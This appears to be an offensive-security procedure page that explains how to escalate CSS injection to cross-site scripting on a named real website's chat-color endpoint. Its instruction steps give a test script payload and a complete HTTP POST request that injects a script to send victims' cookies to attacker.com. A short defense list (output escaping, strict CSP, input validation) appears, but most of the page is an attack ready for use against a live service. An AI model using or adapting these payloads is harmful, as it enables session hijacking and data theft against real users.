---
tags:
  - xss
  - escalation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:57.192Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: bf25c031-80ec-4c1d-b1a9-f50fcf4bd3fe
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Escalate-CSS-Injection-to-XSS-via-HTML-Endpoints

## Summary

This procedure combines CSS injection with endpoints returning unescaped HTML to inject executable JavaScript, escalating from style manipulation to full cross-site scripting.

## Description

Endpoints like POST /choose_broadcaster_chat_color return HTML content (text/html charset=utf-8) without escaping, allowing CSS payloads to bridge into HTML contexts. By injecting CSS that closes rules and appends <script> tags, attackers execute JS in the victim's browser. The scenario targets authenticated sessions where the embed is loaded, leading to session hijacking or data theft. Prerequisites include CSS injection confirmation and access to POST endpoints. Outcomes: Arbitrary code execution, amplifying impact beyond token leakage.

## Requirements

1. Established CSS injection from previous procedures
2. Ability to send POST requests (e.g., via browser dev tools or proxy)
3. Victim interaction with the affected embed

## Defense

Defensive measures and detection strategies:

- Escape HTML outputs in all response contexts
- Use strict CSP to block inline scripts
- Validate and sanitize inputs across CSS and HTML boundaries

## Objectives

1. Inject executable HTML/JS via chained vulnerabilities
2. Achieve arbitrary code execution in the browser
3. Facilitate session takeover or further exploitation

## Instructions

### Step 1: Identify Vulnerable Endpoint

**Context**: Locate endpoints returning unescaped HTML that can be influenced by the CSS injection.

Test POST /choose_broadcaster_chat_color with a sample payload.

> Send a request with body including bgcolor=%7D%3Cscript%3Ealert(1)%3C/script%3E. Expected output: Response contains the injected script tag without escaping.

### Step 2: Craft and Execute Escalation Payload

**Context**: Combine CSS closure with HTML injection to run JS.

Submit POST to /choose_broadcaster_chat_color:

```http
POST /choose_broadcaster_chat_color HTTP/1.1
Host: chaturbate.com
Content-Type: application/x-www-form-urlencoded

bgcolor=%7D*%7Bcolor:red%7D%3Cscript%3Efetch('https://attacker.com/steal?data='+document.cookie)%3C/script%3E
```

> The payload closes CSS, applies a style, then injects a script to exfiltrate cookies. Load in the embed context. Expected output: JS executes, e.g., network request to attacker server or alert.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[escalation]]
